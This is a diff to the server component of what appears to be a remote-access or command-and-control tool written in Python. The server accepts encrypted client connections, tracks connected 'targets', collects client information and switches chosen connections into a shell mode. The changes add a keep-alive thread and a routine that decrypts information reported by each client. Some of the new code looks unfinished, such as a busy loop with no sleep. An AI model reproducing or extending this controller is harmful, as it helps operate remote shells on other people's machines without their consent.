@@ -1,7 +1,6 @@
 from CryptoAC.Asymmetric.Rsa import RSA
 from CryptoAC.Symmetric.AcAes import AesCrypto
 from .ConnectionsManager import ConnectionManager
-from .internalClient import InternalSocketClient
 from Tools.toolsF import randombyte
 import socket
 import time
@@ -21,11 +20,8 @@ class Server(object):
         self.rsa = RSA()
         self.PrivateKey = PrivateKey
         self.rsaBlock = (PrivateKey['n'].bit_length()+7)//8
-        self.testMsg = bytes([100])
-        self.sleepPerPing = 2 
-        self.sleepPeriter = 2
-        self._internalclient = InternalSocketClient()
-        
+        self.sleepPerPing = 60
+        self.sleepPeriter = 2        
        
     def setCipher(self,conn):
         msg = conn.recv(self.rsaBlock)
@@ -41,7 +37,7 @@ class Server(object):
 
     def ping(self, conn, timeout=5):
         try:
-            conn.send(self.testMsg)
+            conn.send(randombyte())
             conn.settimeout(timeout)
             response = conn.recv(3)
             conn.settimeout(None)
@@ -51,16 +47,25 @@ class Server(object):
             pass
         return False
     
+
+    def keepAlive(self, conn, timeout=5):
+        def __internal__():
+            ip = conn.getpeername()[0]
+            while True:
+                if not self.connections.isconnected(ip):
+                    self.ping(conn=conn,timeout=timeout)
+                    self.connections.removeConnection(conn)
+        threading.Thread(target=__internal__).start()
+                
     
     def onConnect(self,conn,addr):
-        self.connections.insertNewConnction(conn)
+        clientInfo = self.retriveClientInfo(conn)
+        self.connections.insertNewConnction(conn, clientInfo)
         while True:
             if self.connections.connctTo == addr[0]:
                 self.connections.connectToTarget(conn)
                 self._setShellMode(conn)
-            elif not self.ping(conn):
-                conn.close()
-                self.connections.removeConnection(conn)
+            elif not self.connections.alive(addr[0]):
                 return
             time.sleep(self.sleepPeriter)
                                
@@ -96,7 +101,14 @@ class Server(object):
         ip = conn.getpeername()[0]
         while self.connections.isconnected(ip):
             time.sleep(5)
-        self.connections.removeConnection(conn)
+
+    def retriveClientInfo(self,conn):
+        header = int.from_bytes(conn.recv(2))
+        data = self.rsa.decrypt(self.PrivateKey,conn.recv(self.rsaBlock))
+        while len(data) < header:
+            data += self.rsa.decrypt(self.PrivateKey,conn.recv(self.rsaBlock))
+        return data
+            
         
     
     def __listener__(self):
